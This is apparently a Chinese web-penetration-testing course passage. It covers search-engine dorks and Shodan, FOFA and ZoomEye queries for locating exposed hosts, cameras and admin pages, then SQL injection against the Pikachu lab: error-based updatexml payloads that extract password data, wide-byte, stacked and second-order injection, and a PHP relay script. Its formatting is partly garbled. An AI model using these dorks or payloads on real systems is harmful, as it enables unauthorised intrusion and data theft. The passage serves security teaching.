腾讯site:ooxx.com 练习 intext:管理fietype:mdb ## 找到含有mdb类型文件的相关站点site:baidu.com filetype:txt ### 查找百度这个域名下含有txt文件的相关站点site:baidu.com intext:## 管理site:baidu.com inurl:loginsite:baidu.com intitle:## 后台# 一般用于查找百度中能够找到的通过php、asp、jsp等语言开发的网站site:baidu.com filetype:aspsite:baidu.com filetype:phpsite:baidu.com filetype:jspsite:baidu.com inurl:file # 这个一般用来找一些有上传文件动作的网站，之后可以检测是否有上传文件漏洞。# 查找某些国家或者地区的通过asp或php等语言开发的站点。site:tw inurl:asp?id= #查找台湾的相关网站的url中包含asp?id=这些关键字的站点site:hk inurl:asp?id= #查找香港的相关网站的url中包含asp?id=这些关键字的站点 2，黑暗搜索引擎 页面上的大致信息介绍 ## 左边内容 Total results ## 搜索到的总数 Top countries ## 使用最多的国家 Top services ## 使用最多的服务 Top organizations ## 使用最多的组织 Top operating systems ## 使用最多的操作系统 Top products ## 使用最多的产品 ## 在主页的中间内容 ## ip地址 ## 主机名 ## ISP(互联网服务提供商（Internet Service Provider），简称ISP，联通、移动、电信等都是) ## 搜索到该数据的时间 ## 该服务器位于的国家 可以随便点击一个ip地址来查看详细信息，比如点击我圈起来的ip地址 如果你想访问这些网站，其实有些是访问不了的，虽然看到了ip地址，但是通过浏览器不一定能够访问，而且很多网站都是国外的，我们最好开启一个fq工具之类的，方便你访问外网。 案例二：搜索一下全球的摄像头信息 webscan #shodan支持组合搜索，比如搜索日本的摄像头：webcam country:JP 有些摄像头是不能直接访问的，会提示如下信息，登录之后才能访问 但是有些是可以的 shodan搜索技巧 hostname：## 搜索指定的主机或域名，例如 hostname:googleport：## 搜索指定的端口或服务，例如 port:21country：## 搜索指定的国家，例如 country:CNcity：## 搜索指定的城市，例如 city:Hefeiorg：## 搜索指定的组织或公司，例如 org:googleisp：## 搜索指定的ISP供应商，例如 isp:China Telecomproduct：## 搜索指定的操作系统/软件/平台，例如 product:Apache httpdversion：## 搜索指定的软件版本，例如 version:1.6.2geo：## 搜索指定的地理位置，参数为经纬度，例如 geo:31.8639, 117.2808before/after：## 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:11-11-15net：## 搜索指定的IP地址或子网，例如 net:210.45.240.0/24还可以组合搜索## 查询中国开发了21端口的网站： country:CN port:21 3，FOFA网络空间资产检索系统（FOFA）是世界上数据覆盖更完整的IT设备搜索引擎，我们有时候也管它叫佛法，拥有全球联网IT设备更全的DNA信息。探索全球互联网的资产信息，进行资产及漏洞影响范围分析、应用分布统计、应用流行度态势感知等，是华顺信安公司开发的，号称能够把你想要的真实内容都搜索出来，比如IP地址什么的，已经做的非常好了。 我们做两个案例 我们先ping一下 dig.chouti.com 出现了一个ip地址，这个是不是真实ip呢，我们拿着ip地址去浏览器访问一下，能看到抽屉网站首页的话，我们基本就能确定它是真实ip，如果看不到，那有可能不是真实的。看效果如下 看不到，所以我们不能确定它是真实ip，那么用FOFA来查一下试试。 案例一：搜索抽屉新热榜的真实IP地址，网址是 https://dig.chouti.com/ ，我们通过自己个人常用的浏览器，比如chrome浏览器来打开这个网站。 在这个页面上点击鼠标右键，点击检查(如果你的键盘上有F12键，那么直接点击F12键也可以)，然后看到如下内容 我们看到这个title标签中的内容是 抽屉新热榜-聚合每日热门、搞笑、有趣资讯 ，把这几个文字拿到佛法(FOFA)中去搜索 看到了真实IP。 案例二：通过https的证书序列号来查询真实ip地址 1.先访问该网站，点击这个小锁，然后点击证书 2.找到证书序列号 3.证书序列号是一串16进制字符，我们需要将其调整为10进制来满足后面在FOFA中的搜索值 方法如下，找到这个网站打开，进行进制转换 网址： https://tool.lu/hexconvert 拿到10进制之后，去FOFA中查询，我们在FOFA中使用cert 语法进行查询 搜索结果如下 找到了这是ip地址，点击这个ip地址去浏览器访问一下看效果 4，钟馗之眼行很多的组合搜索，我们看几个例子 app: ## 组件名（web服务应用程序：nginx、apache、IIS、weblogic等等）ver: ## 组件版本例1：## 搜索使用iis6.0主机：app:Microsoft-IIS ver6.0，可以看到0.6秒搜索到41，781,210左右的使用iis6.0的主机。例2：## 搜索使weblogic主机：app:weblogic httpd port:7001，可以看到0.078秒搜索到42万左右的使用weblogic的主机。例3：## 查询开放3389端口的主机：port:3389例4：## 查询操作系统为Linux系统的服务器，os:linux例5：## 查询公网摄像：service:”routersetup”例6：## 搜索美国的 Apache 服务器：app:Apache country:US 后面还可以接city: 城市名称例7：## 搜索指定ip信息，ip:121.42.173.26例8：## 查询有关taobao.com域名的信息，site:taobao.com例9：## 搜索标题中包含该字符的网站，title:weblogic例10：## 关键字查询，keywords:Nginx 5，ARL灯塔资产侦查系统 资产灯塔，不仅仅是域名收集 1，简介旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。 在开始使用之前，请务必阅读并同意免责声明中的条款，否则请勿下载安装使用本系统。 2，特性 域名资产发现和整理 IPIP 段资产整理 端口扫描和服务识别 WEB 站点指纹识别 资产分组管理和搜索 任务策略配置 计划任务和周期任务 Github 关键字监控 域名IP 资产监控 站点变化监控 文件泄漏等风险检测 nuclei PoC 调用 3，系统要求目前暂不支持Windows。Linux和MAC建议采用Docker运行，系统配置最低2核4G。由于自动资产发现过程中会有大量的的发包，建议采用云服务器可以带来更好的体验。 4，Docker 启动git clone https://github.com/TophantTechnology/ARLcd ARL/docker/docker volume create arl_dbdocker-compose pulldocker-compose up -d 或者直接下载docker-compose配置文件启动 mkdir docker_arlwget -O docker_arl/docker.zip https://github.com/TophantTechnology/ARL/releases/download/v2.5.4/docker.zipcd docker_arlunzip -o docker.zipdocker-compose pulldocker volume create arl_dbdocker-compose up -d Ubuntu 下可以直接执行 apt-get install docker.io docker-compose -y 安装相关依赖 详细说明可以参考: Docker 环境安装 ARL 5，截图 登录页面默认端口5003 (https), 默认用户名密码adminarlpass 任务页面 子域名页面 站点页面 资产监控页面详细说明可以参考：资产分组和监控功能使用说明 策略页面 筛选站点进行任务下发详细说明可以参考： 2.3-新添加功能详细说明 计划任务详细说明可以参考： 2.4.1-新添加功能详细说明 GitHub 监控任务 6，任务选项说明 编号 选项 说明 1 任务名称 任务名称 2 任务目标 任务目标，支持IP，IP段和域名。可一次性下发多个目标 3 域名爆破类型 对域名爆破字典大小, 大字典：常用2万字典大小。测试：少数几个字典，常用于测试功能是否正常 4 端口扫描类型 ALL：全部端口，TOP1000：常用top 1000端口，TOP100：常用top 100端口，测试：少数几个端口 5 域名爆破 是否开启域名爆破 6 DNS字典智能生成 根据已有的域名生成字典进行爆破 7 域名查询插件 已支持的数据源为12个，alienvault, certspotter,crtsh,fofa,hunter 等 8 ARL 历史查询 对arl历史任务结果进行查询用于本次任务 9 端口扫描 是否开启端口扫描，不开启站点会默认探测80,443 10 服务识别 是否进行服务识别，有可能会被防火墙拦截导致结果为空 11 操作系统识别 是否进行操作系统识别，有可能会被防火墙拦截导致结果为空 12 SSL 证书获取 对端口进行SSL 证书获取 13 跳过CDN 对判定为CDN的IP, 将不会扫描端口，并认为80，443是端口是开放的 14 站点识别 对站点进行指纹识别 15 搜索引擎调用 利用搜索引擎搜索下发的目标爬取对应的URL和子域名 16 站点爬虫 利用静态爬虫对站点进行爬取对应的URL 17 站点截图 对站点首页进行截图 18 文件泄露 对站点进行文件泄露检测，会被WAF拦截 19 Host 碰撞 对vhost配置不当进行检测 20 nuclei 调用 调用nuclei 默认PoC 对站点进行检测 ，会被WAF拦截，请谨慎使用该功能 7，配置参数说明Docker环境配置文件路径 docker/config-docker.yaml 配置 说明 CELERY.BROKER_URL rabbitmq连接信息 MONGO mongo 连接信息 QUERY_PLUGIN 域名查询插件数据源Token 配置 GEOIP GEOIP 数据库路径信息 FOFA FOFA API 配置信息 DINGDING 钉钉消息推送配置 EMAIL 邮箱发送配置 GITHUB.TOKEN GITHUB 搜索 TOKEN ARL.AUTH 是否开启认证，不开启有安全风险 ARL.API_KEY arl后端API调用key，如果设置了请注意保密 ARL.BLACK_IPS 为了防止SSRF，屏蔽的IP地址或者IP段 ARL.PORT_TOP_10 自定义端口，对应前端端口测试选项 ARL.DOMAIN_DICT 域名爆破字典，对应前端大字典选项 ARL.FILE_LEAK_DICT 文件泄漏字典 ARL.DOMAIN_BRUTE_CONCURRENT 域名爆破并发数配置 ARL.ALT_DNS_CONCURRENT 组合生成的域名爆破并发数 PROXY.HTTP_URL HTTP代理URL设置 8，忘记密码重置当忘记了登录密码，可以执行下面的命令，然后使用 admin/admin123 就可以登录了。 docker exec -ti arl_mongodb mongo -u admin -p adminuse arldb.user.drop()db.user.insert( username: admin, password: hex_md5(arlsalt!@#+admin123) ) 9，源码安装仅仅适配了 centos 7 ，且灯塔安装目录为optARL如果在其他目录可以创建软连接，且安装了四个服务分别为arl-web, arl-worker, arl-worker-github, arl-scheduler wget https://raw.githubusercontent.com/TophantTechnology/ARL/master/misc/setup-arl.shchmod +x setup-arl.sh./setup-arl.sh 10，Docker 环境安装仅仅适配了 centos 7 ，且灯塔安装目录为optARL wget https://raw.githubusercontent.com/TophantTechnology/ARL/master/misc/setup-docker-arl.shchmod +x setup-docker-arl.sh./setup-docker-arl.sh 11，FAQ请访问如下链接FAQ 九，web十大漏洞9-1 SQL注入漏洞 1，常用的简单测试语句和注释符号说明sql语句的注释符号也是sql注入语句的关键点：常用 # 、 – 。 1、# 和 -- (有个空格)表示注释，可以使它们后面的语句不被执行。在url中，如果是get请求(记住是get请求)，也就是我们在浏览器中输入的url ，解释执行的时候，url中#号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中不包括#，因此使用#闭合无法注释，会报错；而使用-- (有个空格)，在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用--+的方式来闭合，因为+会被解释成空格。2.当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。3.如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如我们在后台登录框中进行注入。4.为什么--后面必须要有空格，而#后面就不需要？ 因为使用--注释时，需要使用空格，才能形成有效的sql语句，而#后面可以有空格，也可以没有，sql就是这么规定的，记住就行了。 因为不加空格，--直接和系统自动生成的单引号连接在了一起，会被认为是一个关键词，无法注释掉系统自动生成的单引号。 简单测试语句： ## 引号测试，加了引号如果报错，证明存在注入点单引号闭合数据：$query=select id,email from member where username=vince; ## 用单引号测试,会报错，双引号测试查不到数据，不报错 双引号闭合数据：$query=select id,email from member where username=vince; ## 用双引号测试，会报错，单引号测试查不到数据，不报错 or 1=1 # 一个条件为真，即为真，真的效果就是查询到表中所有数据where id=1 and 1=1 ## 两个条件为真才为真，查询结果和不加1=1一样，and 1=2 一个条件为假，即为假，查询条件为假，什么数据也没有，两个结合起来可以判断是否存在注入点。union select 联合查询 # 关系型数据库 redis非关系型的是不能用union select的 2,sql注入分类1,数据类型分类## 主要分为如下四类：数字型、字符型、搜索型、xx型 1，数字型数字型注入的时候，是不需要考虑单\\双引号闭合问题的，因为sql语句中的数字是不需要用引号括起来的，如下 mysql select username,email from member where id=1;mysql select username,email from member where id=1 or 1=1; 注入成功，看一下后台代码 注意：我们判断是否为数字型注入，不是通过前端页面上看到的数据是数字就判断它是数字型注入，也有可能是伪数字型，因为后台处理的时候可能是将前端传递过来的数字通过引号括起来了，也就是作为了字符串来处理，所以要多尝试。 2，字符型字符串类型的输入方式 select id,email from member where username=vince or 1=1; 在不知道数据库中用户名的情况下，获取所有用户数据 如果你的验证不了，输入单引号的时候发现没有用，那么可能是因为phpstudy的魔术符号开启了，这是phpstudy的一个安全机制，我们关闭它 3，搜索型## 回到pikachu平台,将拼接语句写为 %xxxx% or 1=1 #% 或者 xxxx% or 1=1 #% 都可以 后台拼接的sql语句为： select * from member where username like %%xxx% or 1=1; 4，xx型何为xx型呢？先看后台代码： XX型是由于SQL语句拼接方式不同，注入语句如下： mysql select * from member where username=(vince) ；mysql select * from member where username=(xx) or 1=1; 回到pikachu平台,将拼接语句写为 XX’) or 11# 5，JSON类型1，json数据的格式：## 类型： 数字（整数或浮点数） age:30,xx:123 字符串（在双引号中） uname:yang 逻辑值（true 或 false） flag:true 数组（在中括号中）sites:[name:yang,name:ming] 对象（在大括号中）JSON 对象在大括号（）中书写： null runoob:null ## 注意点：下面是几个错误的格式 name: 张三, age: 32 // 属性名必须使用双引号 name: 张三, age: 32 //属性值如果是字符串，必须要双引号，不能用单引号 [32, 64, 128, 0xFFF] // 不能使用十六进制值 name: 张三, age: undefined // 不能使用undefined ## 最后一组键值对后面不能有符号，比如不能有逗号了。 2，JSON注入phpstudy已经安装过了，下面是php服务端代码 ?php // php防止中文乱码 header(content-type:text/html;charset=utf-8); if(isset($_POST[json])) $json_str=$_POST[json]; $json=json_decode($json_str); if(!$json) die(JSON文档格式有误，请检查); $username=$json-username; //$password=$json-password; // 建立mysql连接，root/root连接本地数据库 $mysqli=new mysqli(); $mysqli-connect(localhost,root,root); if($mysqli-connect_errno) die(数据库连接失败：.$mysqli-connect_error); // 要操作的数据库名，我的数据库是security $mysqli-select_db(pikachu); if($mysqli-errno) dir(打开数据库失败：.$mysqli-error); // 数据库编码格式 $mysqli-set_charset(utf-8); // 从users表中查询username，password字段 $sql=SELECT username,password FROM users WHERE username=$username; $result=$mysqli-query($sql); if(!$result) die(执行SQL语句失败：.$mysqli-error); else if($result-num_rows==0) die(查询结果为空); else while($data=mysqli_fetch_assoc($result)) $username=$data[username]; $password=$data[password]; echo 用户名：$username,密码：$password; // 释放资源 $result-free(); $mysqli-close(); ? 正常查询效果： json=username:chao 结果 注入查询 json=username:xx or 1=1 # 结果 这就是json类型数据的注入，至于你想通过这个注入点做什么，就可以自行来写一些达到目的的注入语句了 2，SQL注入提交方式分类GET、POST、Cookie等 注入提交方式的分类主要是根据后台代码处理请求方法的方式 ASP：request （全部接受）、request.querystring （接受get）、request.form （接受post）、request.cookie cookie （接受cookie）PHP: $_REQUEST（全部接受）、$_GET $_POST （接受post）、$_COOKIE（接受cookie）#$_GET不是取get请求携带的数据，而是取得查询参数数据其他语言，看开发框架，不同的框架，提取http请求数据的写法或者说函数不同python django -- mvc -- request.GET requset.POST request.body 3，SQL注入请求位置分类请求行、请求头、请求数据部分 其实这个也没有什么好说的，所有提交给后台的数据，只要后台使用这个数据和数据库打交道，那么都可能存在注入点。 我们就看一下请求头的吧 1，http header注入先在pikachu平台打开Http Header注入模块，点击提示查看登录帐号和密码，登陆后去BurpSuite中找到登陆地GET请求，注意，不是点击登录那个请求，而是登录成功之后加载页面的那个get请求昂，把请求发送到Repeater模块中，去除User-Agent：，然后输入’ 然后运行后观察MYSQL语法报错然后发现存 在SQL注入漏洞。这时候可以设置payload。在User-Agent输入payload Mozilla’ or updatexml(1,concat(0x7e,database()),0) or ‘ ，因为有些企业把user-agent等请求头键值对的数据也保存在了数据库里面。php专门取请求头数据的，使用的方法是 $_SERVER[‘请求头键’]就能拿到值。 好，接下来修改这个包的user-agent，进行注入 结果出来了，我们自己看一下源码就知道了，user-agent肯定和数据库交互了 4，报错注入在MYSQL中使用一些指定的函数来制造报错,从而从报错信息中获取设定的信息，常见的selectinsertupdatedelete注入都可以使用报错方式来获取信息。为什么要用函数报错呢，是因为我们上面学到的一些注入测试手段，可能看不到报错，被屏蔽或者处理了，就不好判断是否有注入点，所以我们学一下基于函数的报错。 1，常用的报错信息函数## Updatexml() :函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。## extractvalue() :函数也是MYSQL对XML文档数据进行查询的XPATH函数。## floor() :MYSQL中用来取整的函数。## 其实可完成报错注入的mysql函数有很多，大概有10几个，这里我就不一一说了。k and updatexml(1,concat(0x7e,(select database()),0x7e),2)#k and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)# 2，实战测试1，爆破数据库版本信息k and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) # ## k这个字母是随便写的昂，写啥都行，0x7e是16进制，表示一个~符号 k and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) # ## 那么这里为什么不直接写~，而是写成了16进制呢，因为~本身为字符串，如果直接写~，需要用引号引起来，如果用单引号的话，势必会和我们前面闭合用的单引号有些冲突，所以只能用双引号，所以还需要写引号，比较麻烦，并且如果别人后台对引号做了限制的话，我们用引号就会注入失败。k and updatexml(1,concat(~,(SELECT @@version),~),1) # 上面整句话的意思是，执行updatexml函数，匹配1这个数据中符合这个匹配规则 报错，但是看到了数据库版本。 2，爆破数据库当前用户k and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)# 3，爆破数据库k and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) # 4，爆表## 5.1版本及以上版本，mysql数据库中会存在一个叫做information_schema的默认数据库，这个库里面记录着整个mysql管理的数据库的名称、表名、列名(字段名).获取数据库表名，输入：kand updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu)),0)### 但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示，看报错 ## limit限制一行，输入k and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu limit 0,1)),0)### 更改limit后面的数字limit 0 完成表名遍历。 5,爆字段## 获取字段名，输入：k and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=users and table_schema=pikachu limit 2,1)),0)# 6、爆字段内容## 获取字段内容，输入：k and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)# ## 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。## 通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath 格式的字符串,所以不符合要求，然后报错。 5,sql注入查询语句分类## select、delete、update、insert，也就是增删改查。## select不用多说，前面一直在用。## 其实insert\\update\\delete等也是mysql的函数 1，insert注入进入pikachu网站注册页面，填写网站注册相关信息 点击注册，来到注册页面，输入注册信息，然后通过Burp抓包在用户名输入相关payload，格式如下： 提交了这么多的数据，每个数据都有可能存在注入点，手动一个一个的测，太累了，所以后面我们会学一些自动化的工具。 1，爆表名jadenor updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=pikachu limit 0,1)),0) or 2，爆列名 or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=users limit 2,1)),0) or 3，爆内容 or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or等同于 or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or 1=1 2，update注入与insert注入的方法大体相同，区别在于update用于用户登陆端(或者修改数据的地方)，登录端一般说的是修改最后一次登录时间等信息，insert用于用于用户注册端。 一般登录网站前台或后台更新用户信息的地方，填写用户需要修改相关信息，通过Burp抓包在用户名输入相关payload，格式如下： 看pikachu，我们先注册一个账号 然后登录 看到如下页面，点击修改个人信息 如下页面，我们修改一下手机号，然后点击submit，通过burp抓包一下看看 上面我们看到有四个数据发送到了后台，但是目前不知道哪个是注入点，需要一个个的测，经测试发现 手机号有个注入点： update注入： or updatexml(0,concat(0x7e,(select database())),0) or 3，delete注入般应用于前后端发贴、留言、用户等相关删除操作，点击删除按钮时可通过Brup Suite抓包，对数据包相关delete参数进行注入，一般普通的用户是没有权限删除数据的，管理员才行。 pikachu中看效果，我们先做几条留言，方便删除的时候用 你会发现每个删除按钮其实都对应一个网址，点击删除就往后台发送请求 我们通过burp抓包看看效果 好，开始注入，注入方法如下： deletefrom message where id=56 or updatexml(2,concat(0x7e,(database())),0) #注意这是个数字型注入，所以不要引号昂56%20or%20updatexml(2,concat(0x7e,(database())),0) 空格编码了 效果，直接在地址栏输入注入即可看到。 6，宽字节注入1，注入防御之引号转义和绕过思路好多网站，尤其是php的网站，为了防止sql注入，经常会采用一个手段就是引号转义，比如开启全局GPC配置，如下phpstudy中开启： 也就是php.ini配置文件中添加magic_quotes_gpcon。或者是使用一些转义函数，比如：addslashes和mysql_real_escape_string，他们转义的字符是单引号(‘)、双引号(“)、反斜线()与NUL(NULL 字符)，转义的方式就是在这些符号前面自动加上 \\ ，让这些符号的意义失效，或者可以理解为被注释掉了。 编码转换工具：https://tool.chinaz.com/tools/urlencode.aspx 那么我们的sql注入语句就跟着失效了，因为好多时候，我们写注入语句难免会使用到引号等特殊符号，比如下面这个 http://192.168.2.109/pikachu/vul/sqli/sqli_str.php?name=xx%27+or+1%3D1%23submit=%E6%9F%A5%E8%AF%A2name=xx%27+or+1%3D1%23其实就是name=xxor 1=1#进行了url编码之后的效果。如果后台执行的sql语句为$uname = $_GET(name)select * from member where username=$uname;## 再注入这样的语句时，由于被转义了，得到的sql语句将是如下效果的select * from member where username=xxx\\or 1=1#;，## 后面的引号被转义，导致不能和前面的引号闭合上，那么这个sql语句的语法就是错误的，所有不会达到注入的效果，这就是防御的手段。 这样就没有办法了，不是的，还可以尝试宽字节注入，那么这里我们提一下，上面的语句其实应该是这样的 $uname = $_GET(name) -- $uname其实等于 xxx%27+or+1%3D1+%23,## 但是我们要解码啊，所以，其实后台获得的这个$uname变量数据实际上是xxx0x27+or+10x3D1+0x23，因为%是url编码时十六进制数据的前缀0x的简写。## 后台转义单引号的时候，其实在前面加上\\的时候，加的是\\的十六进制编码，而\\的十六进制编码为0x5C,也就是说xxx0x27这个数据，其实到后台加上转义之后，是xxx0x5C0x27,那么发散思路，我们可能就会想到，由于汉字在GBK编码的时候是两个十六进制的字节，UTF8是三个字节，而这个\\是一个字节0x5c，如果我们能够再提供一个或者两个十六进制的字节数据和这个0x5c可以合并为一个汉字的编码的话，那么这个\\不就被我们吃掉了吗？那么单引号就又可以生效了。 2，注入测试 其中，我在%27前面加上了一个%df，也就是0xdf，到了后台之后单引号前面加上了0x5c，然后url解码，如下 xxx0xdf0x5C0x27+or+10x3D1+0x23## 拼接到sql语句中如下select * from member where username=xxx0xdf0x5C0x27+or+10x3D1+0x23;注入如下：xx%df%27+or+1%3D1%23 ------ xx%df or 1=1# 那么看一下后台代码 由于代码中设置了set character_set_client’gbk’，那么将刚才拼接好的sql语句发送给mysql的时候，采用的gbk编码，那么sql语句就会变为如下： select * from member where username=xxx0xdf0x5C0x27+or+10x3D1+0x23;GBK编码的数据库，会将0xdf0x5c识别为運字，这样\\被0xdf给吃掉了，变成了一个汉字，这样的话，单引号就有效了，就可以闭合前面的引号了，后面的or 1=1#这样的注入语句又能成功执行了，如下：select * from member where username = chao運 or 1=1 #` -- 什么都查询到了 整理一下请求网址和sql语句，如下 ## 请求： http://www.jaden.cn/?username=chao #正常请求 http://www.jaden.cn/?username=chao or 1=1 # #注入语句 http://www.jaden.cn/?username=chao\\ or 1=1 # #单引号前面被自动加上了\\进行了转义，单引号失效 ## 后台拼接的sql语句： select * from member where username=chao; #正常查询 select * from member where username = chao or 1=1 # #注入成功的 select * from member where username = chao\\ or 1=1 # #\\转义之后的sql语句 ## url编码之后的请求和sql语句写法 http://www.jaden.cn/?username=chao%5c or 1=1 # get请求携带数据时，一般会自动进行url编码，\\编码为%5C select * from member where username = chao%5c or 1=1 ### 如果后台数据库的编码为GBK，那么尝试宽字节注入，在引号前面加上%df http://www.jaden.cn/?username=chao%df%5c or 1=1 ### 宽字节注入之后，拼接的sql语句 select * from member where username = chao%df%5c or 1=1 ### GBK编码的数据库，会将%df%5c识别为運字，这样\\被%df给吃掉了，变成了一个汉字，这样的话，单引号就有效了，就可以闭合前面的引号了，后面的or 1=1#这样的注入语句又能成功执行了，如下： select * from member where username = chao運 or 1=1 #` -- 什么都查询到了 7，偏移量注入原理： 偏移注入是一种注入姿势，可以根据一个较多字段的表对一个少字段的表进行偏移注入，一般是联合查询，在页面有回显点的情况下。偏移注入现在用的不多了，因为有时候不太好用昂，示例中有提及。 在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。 当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。 ## 假设一个表有8个字段，admin表有3个字段。联合查询payload：union select 1,2,3,4,5,6,7,8 from admin 在我们不知道admin有多少字段的情况下可以尝试payload：union select 1,2,3,4,5,6,7,admin.* ## from admin，此时页面出错直到payload：union select 1,2,3,4,5,admin.* from admin时页面返回正常，说明admin表有三个字段 那么，如果页面上显示的2，3，4这三个字段数据，那么我们就可以将admin.提前，比如 union select 1,admin.,2,3,4,5 from admin ，那么admin表的数据在不知道字段名称的情况下就被回显出来了。 测试： 修改一下代码文件： 然后抓包，添加偏移量注入的语句： 8，其他注入手段1，加密注入前端提交的有些数据是加密之后，到了后台在解密，然后再进行数据库查询等相关操作的，那么既然如此我们也应该将注入语句按照相同的加密方式，加密之后再进行注入，比如，看搜狐这个网址： 两个 结尾，一般是base64加密的，我们解密看看效果 如果想构造注入的话，我们应该这样 然后将加密之后的数据替换到原网址位置然后发送请求。这个大家知道意思即可，搜狐这里肯定是没有注入点的昂。 2，堆叠注入原理： ## 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。堆叠查询可以执行多条 SQL 语句，语句之间以分号(;)隔开，而堆叠查询注入攻击就是利用此特点，在第二条语句中构造要执行攻击的语句。但是堆叠查询只能返回第一条查询信息，不返回后面的信息。因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。## 在 mysql 中php的函数里面 mysqli_multi_query 和 mysql_multi_query这两个函数（函数也叫做API）执行一个或多个针对数据库的查询。多个查询用分号进行分隔。堆叠注入的危害是很大，可以任意使用增删改查的语句，例如删除数据库 修改数据库，添加数据库用户。但实际情况中，如PHP为了防止sql注入，往往调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将对数据安全造成重大威胁。## 限制：堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。## mysql中有些API是支持的，sqlserver都支持，oracle不支持。 3，二次注入## 这个漏洞基本上黑盒测试是很难发现的，基本都是代码审计出来的，找程序代码中操作数据库中数据的地方，看一下从数据库中取出的数据是否进行了脏数据过滤。## 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。## 二次注入的原理，以php代码来举例，在第一次进行数据库插入数据的时候，仅仅只是使用了addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，比如单引号数据，虽然直接注入时效了，但是数据写入到了数据库，数据库中存的这个数据本身还是脏数据。在将数据存入到了数据库中之后，很多开发者都会认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。 二次注入，可以概括为以下两步 第一步：插入恶意数据 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 第二步：引用恶意数据 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。 示意图 php最表单数据转义用的函数，但是保存到数据库里面会去掉转义 mysqli_query # 用这个函数执行SQL语句默认不显示错误信息！ 4，中转注入把参数中转一下，再发送到指定网址上去，可以对请求携带的数据进行二次加工。 比如，我用下面这个webug虚拟机演示一下中转注入，物理机将请求发给它，它将请求数据处理一下，然后转发给pikachu站点进行注入。 ?php $a = $_GET[name]; //jaden $a_64 = base64_encode($a); $url=http://192.168.2.109/pikachu/vul/sqli/sqli_str.php?name=.$a_64.submit=%E6%9F%A5%E8%AF%A2; echo $url; $ret = file_get_contents($url); echo $ret;? 后面学习了sqlmap之后，也可以直接将sqlmap的请求都发送到这个脚本上，那么凡是通过这个脚本的payload，都会被base64编码一下，然后再发送给目标。 5，伪静态注入首先要明白概念，伪静态，其实就是看似为静态页面，实则为动态页面，就称之为伪静态页面，而伪静态页面的注入就叫做伪静态注入。 其实关于静态、动态、伪静态，我们直接看url大致就能发现。 ## 动态： http://192.168.0.26/pikachu/vul/sqli/sqli_str.php?name=vincesubmit=%E6%9F%A5%E8%AF%A2 https://search.jd.com/search?keyword=%E6%89%8B%E6%9C%BAwq=%E6%89%8B%E6%9C%BAev=5_122671%5E## 静态： http://127.0.0.1:8000/jaden/index.html http://127.0.0.1:8000/jaden/person.html## 伪静态： http://127.0.0.1:8000/jaden/1/wei_news.html http://127.0.0.1:8000/jaden/news/1.html ## 动态访问：http://192.168.61.149/forum.php?mod=viewthreadtid=1extra=page%3D1 ## 静态访问：http://192.168.61.149/thread-1-1-1.html ## 配置规则：rewrite ^([^\\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\\.html$ $1/forum.php?mod=viewthreadtid=$2extra=page%3D$4page=$3 last; 